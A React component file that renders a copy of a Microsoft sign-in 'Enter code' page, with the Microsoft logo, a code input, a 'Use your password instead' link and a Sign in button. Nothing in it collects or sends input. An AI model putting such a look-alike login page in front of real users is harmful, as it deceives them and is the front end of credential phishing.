import logo from './img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg';
import './App.css';
import { Link } from "react-router-dom";
// import localStorage from 'localStorage';

function Code() {
const email  = () => {
    if (!localStorage.getItem('email')) {
        localStorage.setItem('email', '');
      }
    }
  return (
    <>
        <div className="container">
      <div className="container2">
        <img className="logo" src={logo} alt="logo"/>
        <p style={{ color: 'red' }}>{email}</p>
        <h2  style={{fontSize:'24px', fontWeight:'600',height:'28px', width:'352px', textDecoration: 'none solid rgb(27,27,27)'}}>
            Enter code
        </h2>
        <input id="myInput" type="email" placeholder="Enter code"/>
        <br/>
        <p style={{marginBottom: '0px', fontSize:'15px'}}>
        <Link to="/about" id="link" style={{color: '#0067b8'}}>
                Use your password instead
            </Link>
        </p>
        <div>
          <a href="">
            <button type="button" id="next">Sign in</button>
          </a>
        </div>
    
      </div>
    
    </div>
    
    <div className="footer">
      <div className="footer-links">
        <a className="footer-text" href="#">Terms of use</a>
        <a className="footer-text" href="#">Privacy & cookies</a>
        <a className="footer-text" href="">. . .</a>
      </div>
    </div>
    </>
  )
}

export default Code;